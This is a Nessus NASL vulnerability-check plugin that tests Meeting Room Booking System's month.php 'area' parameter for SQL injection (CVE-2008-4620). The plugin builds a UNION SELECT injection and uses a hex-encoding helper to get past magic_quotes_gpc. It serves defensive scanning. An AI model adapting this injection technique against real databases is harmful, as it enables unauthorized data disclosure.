#
# (C) Tenable Network Security, Inc.
#


if ( NASL_LEVEL < 3000 ) exit(0);



include("compat.inc");

if (description)
{
  script_id(35600);
  script_version("$Revision: 1.4 $");

  script_cve_id("CVE-2008-4620");
  script_bugtraq_id(31809);
  script_xref(name:"milw0rm", value:"6781");
  script_xref(name:"OSVDB", value:"49221");

  script_name(english:"Meeting Room Booking System (MRBS) month.php area Parameter SQL Injection");
  script_summary(english:"Tries to manipulate room listing");

 script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP script that is prone to a SQL
injection attack." );
 script_set_attribute(attribute:"description", value:
"The remote host is running Meeting Room Booking System (MRBS), a PHP
application for booking meeting rooms or other resources. 

The version of MRBS installed on the remote host fails to sanitize
user-supplied input to the 'area' parameter of the 'month.php' script
before using it to construct database queries.  Regardless of PHP's
'magic_quotes_gpc' setting, an unauthenticated attacker may be able to
exploit this issue to manipulate database queries, leading to
disclosure of sensitive information or attacks against the underlying
database. 

Note that the application's 'day.php' and 'week.php'' scripts are also
reportedly affected by the same issue, although Nessus has not checked
them." );
 script_set_attribute(attribute:"solution", value:
"Unknown at this time." );
 script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P" );
script_end_attributes();


  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2009 Tenable Network Security, Inc.");

  script_dependencies("http_version.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("global_settings.inc");
include("misc_func.inc");
include("http.inc");


port = get_http_port(default:80, embedded: 0);
if (!can_host_php(port:port)) exit(0);

# This function converts a string to a concatenation of hex chars so we
# can pass in strings without worrying about PHP's magic_quotes_gpc.
function hexify(str)
{
  local_var hstr, i, l;

  l = strlen(str);
  if (l == 0) return "";

  hstr = "concat(";
  for (i=0; i<l; i++)
    hstr += hex(ord(str[i])) + ",";
  hstr[strlen(hstr)-1] = ")";

  return hstr;
}


# Loop through directories.
if (thorough_tests) dirs = list_uniq(make_list("/mrbs", "/calendar", cgi_dirs()));
else dirs = make_list(cgi_dirs());

foreach dir (dirs)
{
  # Try to exploit the issue to manipulate the room view.
  id = unixtime();
  room_name = SCRIPT_NAME;
  exploit = string("-1 UNION SELECT ", id, ",", hexify(str:room_name), " -- ");
  url = string(
    dir, "/month.php?",
    "year=2008&",
    "month=08&",
    "area=", str_replace(find:" ", replace:"%20", string:exploit)
  );

  res = http_send_recv3(method:"GET", item:url, port:port);
  if (isnull(res)) exit(0);

  # There's a problem if we see our id / room name.
  if (string('&room=', id, '">', room_name, '</a>') >< res[2])
  {
    if (report_verbosity)
    {
      report = string(
        "\n",
        "Nessus was able to verify the vulnerability exists using the following\n",
        "URL :\n",
        "\n",
        "  ", build_url(port:port, qs:url), "\n"
      );
      security_hole(port:port, extra:report);
    }
    else security_hole(port);

    set_kb_item(name:'www/'+port+'/SQLInjection', value:TRUE);
    exit(0);
  }
}
